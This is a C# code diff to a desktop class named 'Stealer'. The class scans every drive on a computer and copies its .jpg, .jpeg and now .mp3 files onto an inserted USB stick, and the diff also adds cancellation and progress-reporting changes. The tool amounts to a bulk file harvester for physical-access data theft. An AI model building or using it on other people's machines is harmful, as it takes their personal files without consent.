@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Threading;
@@ -18,10 +19,11 @@ namespace Logic
         private StreamWriter streamWriter;
         private DriveInfo[] drives;
         private Action<string> WriteInformation;
-        private string[] Extensions = { ".jpg", ".jpeg" };
+        private string[] Extensions = { ".jpg", ".jpeg", ".mp3" };
         public EventHandler<CountFilesEventArgs> TotalCountFilesChanged;
         public EventHandler<CountFilesEventArgs> CountFilesChanged;
         public EventHandler<DriveInformationEventArgs> DriveChanged;
+        private CancellationTokenSource cancellationToken = new CancellationTokenSource();
 
         public Stealer(DriveInfo usbDrive, DriveInfo[] Drives)
         {
@@ -70,6 +72,7 @@ namespace Logic
 
         public async void StealAsync()
         {
+
             if (!usbDrive.IsReady)
             {
                 WriteInformation("Flash card isn't found. Please insert it and try again.");
@@ -82,22 +85,26 @@ namespace Logic
             }
 
             streamWriter = new StreamWriter(String.Format("{0}FilesList{1}.txt", usbDrive.Name, DateTime.Now.ToShortDateString()), false, System.Text.Encoding.Default);
-
             foreach (DriveInfo drive in drives)
             {
                 try
                 {
+                    bool success = false;
                     if (drive.IsReady)
                     {
-                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} {1} is checking\n", drive.Name, drive.VolumeLabel))));
+                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} {1} is checking", drive.Name, drive.VolumeLabel))));
                         Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("About drive:\n\tDrive Format: {0}\n\tDrive Type: {1}\n\tTotal Size: {2}", drive.DriveFormat, drive.DriveType, drive.TotalSize))));
-
-                        await Task.Run(() => Search(drive.Name));
-                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} is checked. Found {1} files", drive.Name, count))));
+                        
+                        await Task.Run(() => Search(drive.Name), cancellationToken.Token);
+                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} is checked. Found {1} files\n", drive.Name, count))));
                         count = 0;
+                        success = true;
                     }
 
-                    Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs("Drive " + drive.Name + " is skiped. \nAbout drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize + "\n\tDrive status: " + (drive.IsReady ? "Ready" : "Isn't Ready"))));
+                    if (!success)
+                    {
+                        Application.Current.Dispatcher.Invoke(() => DriveChanged?.Invoke(this, new DriveInformationEventArgs("Drive " + drive.Name + " is skiped. \nAbout drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize + "\n\tDrive status: " + (drive.IsReady ? "Ready" : "Isn't Ready"))));
+                    }
                 }
                 catch (System.IO.IOException) { }
                 catch (System.NullReferenceException) { }
@@ -129,6 +136,10 @@ namespace Logic
                         string[] files = Directory.GetFiles(directory);
                         foreach (string fullFileName in files)
                         {
+                            if (cancellationToken.Token.IsCancellationRequested)
+                            {
+                                return;
+                            }
                             FileInfo file = new FileInfo(fullFileName);
                             foreach (string extension in Extensions)
                             {
@@ -140,13 +151,13 @@ namespace Logic
                                         if (!Directory.Exists(catalogForCopy))
                                         {
                                             Directory.CreateDirectory(catalogForCopy);
-                                            Application.Current.Dispatcher.Invoke(() => WriteInformation(fullFileName));
-                                            count++;
-                                            Application.Current.Dispatcher.Invoke(() => CountFilesChanged?.Invoke(this, new CountFilesEventArgs(count)));
                                         }
                                         file.CopyTo(catalogForCopy + file.Name, false);
                                     }
                                     catch (System.IO.IOException) { }
+                                    Application.Current.Dispatcher.Invoke(() => WriteInformation(fullFileName));
+                                    count++;
+                                    Application.Current.Dispatcher.Invoke(() => CountFilesChanged?.Invoke(this, new CountFilesEventArgs(count)));
                                 }
                             }
                             totalCount++;
@@ -158,6 +169,14 @@ namespace Logic
                     }
                     catch (System.UnauthorizedAccessException) { }
                 }
+            }
+        }
+
+        public void StopSteal()
+        {
+            if (!(cancellationToken is null))
+            {
+                cancellationToken.Cancel();
             }
         }
     }
